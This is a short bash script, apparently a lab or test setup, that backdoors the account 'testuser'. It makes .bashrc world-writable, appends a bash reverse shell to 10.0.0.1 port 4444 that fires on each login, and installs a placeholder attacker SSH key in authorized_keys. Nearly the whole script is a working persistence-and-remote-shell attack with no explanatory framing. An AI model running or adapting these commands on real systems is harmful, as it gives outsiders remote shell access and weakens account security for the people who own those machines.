#!/bin/bash
chmod 755 /home/testuser
chmod 666 /home/testuser/.bashrc
echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /home/testuser/.bashrc
mkdir -p /home/testuser/.ssh
chmod 755 /home/testuser/.ssh
echo "ssh-rsa AAAA...attacker_key" > /home/testuser/.ssh/authorized_keys
chmod 644 /home/testuser/.ssh/authorized_keys
